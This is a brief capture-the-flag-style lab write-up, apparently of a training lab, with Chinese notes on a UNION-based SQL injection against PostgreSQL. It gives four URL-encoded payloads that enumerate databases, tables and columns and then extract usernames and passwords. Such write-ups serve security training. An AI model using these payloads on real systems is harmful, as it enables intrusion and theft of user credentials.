# Lab: SQL injection attack, listing the database contents on non-Oracle databases

This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user.

## SQL injection
* 注入點在 `category`
* 題目說要列出所有的 databases 再慢慢找 tables 跟 columns，好想用 sqlmap 歐 QQ
* 稍微測了一下，用的是 `PostgreSQL`
```
// 列舉 databases
payload = %27%20union%20select%20NULL,datname%20FROM%20pg_database%20--%20-
```
```
// 列舉 tables
payload = %27%20union%20select%20NULL,tablename%20FROM%20pg_tables%20--%20-
```
```
// 查 users_cuhtuf 有哪些 columns
payload = %27%20union%20select%20NULL,column_name%20FROM%20information_schema.columns%20WHERE%20table_name=%27users_cuhtuf%27%20--%20-
```
```
// 拿 username password
payload = %27%20union%20select%20username_kymppj,password_yyqmqc%20from%20users_cuhtuf%20--%20-
```
